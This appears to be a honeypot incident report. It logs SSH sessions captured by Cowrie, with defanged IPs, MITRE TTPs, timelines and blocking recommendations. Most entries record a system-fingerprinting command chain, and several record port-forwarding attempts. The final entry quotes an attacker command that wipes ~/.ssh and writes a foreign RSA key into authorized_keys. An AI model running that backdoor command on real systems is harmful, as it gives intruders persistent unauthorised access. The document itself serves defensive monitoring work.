### 🔴 HIGH · IR-de1caf1a1e9d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:05 |
| **Last Seen** | 2026-09-01 16:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:05:19` | `cowrie.session.connect` |
| `2026-09-01 16:05:19` | `cowrie.client.version` |
| `2026-09-01 16:05:19` | `cowrie.client.kex` |
| `2026-09-01 16:05:20` | `cowrie.login.success` |
| `2026-09-01 16:05:21` | `cowrie.session.params` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.success` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:21` | `cowrie.command.input` |
| `2026-09-01 16:05:22` | `cowrie.log.closed` |
| `2026-09-01 16:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af08845bc4d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:07 |
| **Last Seen** | 2026-09-01 16:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:07:18` | `cowrie.session.connect` |
| `2026-09-01 16:07:18` | `cowrie.client.version` |
| `2026-09-01 16:07:18` | `cowrie.client.kex` |
| `2026-09-01 16:07:19` | `cowrie.login.success` |
| `2026-09-01 16:07:20` | `cowrie.session.params` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.success` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:20` | `cowrie.command.input` |
| `2026-09-01 16:07:21` | `cowrie.log.closed` |
| `2026-09-01 16:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4302cfa522

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:09 |
| **Last Seen** | 2026-09-01 16:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:09:16` | `cowrie.session.connect` |
| `2026-09-01 16:09:17` | `cowrie.client.version` |
| `2026-09-01 16:09:17` | `cowrie.client.kex` |
| `2026-09-01 16:09:17` | `cowrie.login.success` |
| `2026-09-01 16:09:19` | `cowrie.session.params` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.success` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.command.input` |
| `2026-09-01 16:09:19` | `cowrie.log.closed` |
| `2026-09-01 16:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97bd1748aebe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:11 |
| **Last Seen** | 2026-09-01 16:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:11:15` | `cowrie.session.connect` |
| `2026-09-01 16:11:15` | `cowrie.client.version` |
| `2026-09-01 16:11:15` | `cowrie.client.kex` |
| `2026-09-01 16:11:16` | `cowrie.login.success` |
| `2026-09-01 16:11:17` | `cowrie.session.params` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.success` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:17` | `cowrie.command.input` |
| `2026-09-01 16:11:18` | `cowrie.log.closed` |
| `2026-09-01 16:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3d0df3b1f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:13 |
| **Last Seen** | 2026-09-01 16:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:13:05` | `cowrie.session.connect` |
| `2026-09-01 16:13:05` | `cowrie.client.version` |
| `2026-09-01 16:13:05` | `cowrie.client.kex` |
| `2026-09-01 16:13:06` | `cowrie.login.success` |
| `2026-09-01 16:13:07` | `cowrie.session.params` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.success` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:07` | `cowrie.command.input` |
| `2026-09-01 16:13:08` | `cowrie.command.input` |
| `2026-09-01 16:13:08` | `cowrie.command.input` |
| `2026-09-01 16:13:08` | `cowrie.log.closed` |
| `2026-09-01 16:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bc09d3599f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:14 |
| **Last Seen** | 2026-09-01 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:14:25` | `cowrie.session.connect` |
| `2026-09-01 16:14:25` | `cowrie.client.version` |
| `2026-09-01 16:14:25` | `cowrie.client.kex` |
| `2026-09-01 16:14:26` | `cowrie.login.success` |
| `2026-09-01 16:14:26` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:14:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:14:27` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252339fe7dff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:14 |
| **Last Seen** | 2026-09-01 16:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:14:40` | `cowrie.session.connect` |
| `2026-09-01 16:14:40` | `cowrie.client.version` |
| `2026-09-01 16:14:40` | `cowrie.client.kex` |
| `2026-09-01 16:14:42` | `cowrie.login.success` |
| `2026-09-01 16:14:44` | `cowrie.session.params` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.success` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.command.input` |
| `2026-09-01 16:14:44` | `cowrie.log.closed` |
| `2026-09-01 16:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e8c0a22dc1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:15 |
| **Last Seen** | 2026-09-01 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:15:14` | `cowrie.session.connect` |
| `2026-09-01 16:15:14` | `cowrie.client.version` |
| `2026-09-01 16:15:15` | `cowrie.client.kex` |
| `2026-09-01 16:15:15` | `cowrie.login.success` |
| `2026-09-01 16:15:16` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:15:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:15:16` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9af1c00f860

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:16 |
| **Last Seen** | 2026-09-01 16:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:16:15` | `cowrie.session.connect` |
| `2026-09-01 16:16:15` | `cowrie.client.version` |
| `2026-09-01 16:16:15` | `cowrie.client.kex` |
| `2026-09-01 16:16:17` | `cowrie.login.success` |
| `2026-09-01 16:16:19` | `cowrie.session.params` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.success` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:19` | `cowrie.command.input` |
| `2026-09-01 16:16:20` | `cowrie.log.closed` |
| `2026-09-01 16:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3103bb6618

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:17 |
| **Last Seen** | 2026-09-01 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:17:52` | `cowrie.session.connect` |
| `2026-09-01 16:17:52` | `cowrie.client.version` |
| `2026-09-01 16:17:52` | `cowrie.client.kex` |
| `2026-09-01 16:17:54` | `cowrie.login.success` |
| `2026-09-01 16:17:55` | `cowrie.session.params` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.success` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:55` | `cowrie.command.input` |
| `2026-09-01 16:17:56` | `cowrie.log.closed` |
| `2026-09-01 16:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc65fc450a4e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:19 |
| **Last Seen** | 2026-09-01 16:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:19:30` | `cowrie.session.connect` |
| `2026-09-01 16:19:30` | `cowrie.client.version` |
| `2026-09-01 16:19:30` | `cowrie.client.kex` |
| `2026-09-01 16:19:31` | `cowrie.login.success` |
| `2026-09-01 16:19:33` | `cowrie.session.params` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.success` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.command.input` |
| `2026-09-01 16:19:33` | `cowrie.log.closed` |
| `2026-09-01 16:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1182f373720f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:23 |
| **Last Seen** | 2026-09-01 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:23:52` | `cowrie.session.connect` |
| `2026-09-01 16:23:52` | `cowrie.client.version` |
| `2026-09-01 16:23:52` | `cowrie.client.kex` |
| `2026-09-01 16:23:53` | `cowrie.login.success` |
| `2026-09-01 16:23:53` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:23:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:23:53` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dea7df71262

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:26 |
| **Last Seen** | 2026-09-01 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:26:00` | `cowrie.session.connect` |
| `2026-09-01 16:26:00` | `cowrie.client.version` |
| `2026-09-01 16:26:00` | `cowrie.client.kex` |
| `2026-09-01 16:26:01` | `cowrie.login.success` |
| `2026-09-01 16:26:01` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:26:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:26:01` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf05c533f19

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-09-01 16:30 |
| **Last Seen** | 2026-09-01 16:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:30:15` | `cowrie.session.connect` |
| `2026-09-01 16:30:15` | `cowrie.client.version` |
| `2026-09-01 16:30:16` | `cowrie.client.kex` |
| `2026-09-01 16:30:16` | `cowrie.login.success` |
| `2026-09-01 16:30:17` | `cowrie.session.params` |
| `2026-09-01 16:30:17` | `cowrie.command.input` |
| `2026-09-01 16:30:17` | `cowrie.command.failed` |
| `2026-09-01 16:30:18` | `cowrie.log.closed` |
| `2026-09-01 16:30:19` | `cowrie.session.params` |
| `2026-09-01 16:30:19` | `cowrie.command.input` |
| `2026-09-01 16:30:19` | `cowrie.session.file_download` |
| `2026-09-01 16:30:19` | `cowrie.log.closed` |
| `2026-09-01 16:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
